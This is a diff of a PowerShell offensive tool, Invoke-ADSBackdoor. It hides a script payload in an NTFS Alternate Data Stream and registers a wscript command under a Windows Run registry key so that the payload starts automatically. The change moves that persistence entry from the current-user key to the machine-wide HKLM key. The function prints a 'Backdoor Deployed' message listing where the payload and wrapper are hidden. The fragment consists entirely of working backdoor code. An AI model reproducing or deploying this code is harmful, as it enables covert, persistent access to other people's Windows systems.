@@ -61,10 +61,10 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
     Invoke-Command -ScriptBlock $createWrapperADS
     
     $backCommand = "`"wscript.exe " + "$backdoored_file_path" + ":$wrapper_adsfile_name`""
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value $backCommand -Force
-    
+    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value $backCommand -Force
+    # TODO: make key path selectable. For reference, see: https://support.microsoft.com/en-us/kb/314866 & http://www.differencebetween.net/technology/hardware-technology/difference-between-hkey_current_user-and-hkey_local_machine/
     Write-Host "Backdoor Deployed, details provided below; take notes:"
-    Write-Host "Reg key path: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$RegKeyName"
+    Write-Host "Reg key path: HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\$RegKeyName"
     Write-Host "Payload path: $backADSFile"
     Write-Host "Wrapper path: $wrapADSFile"
 }
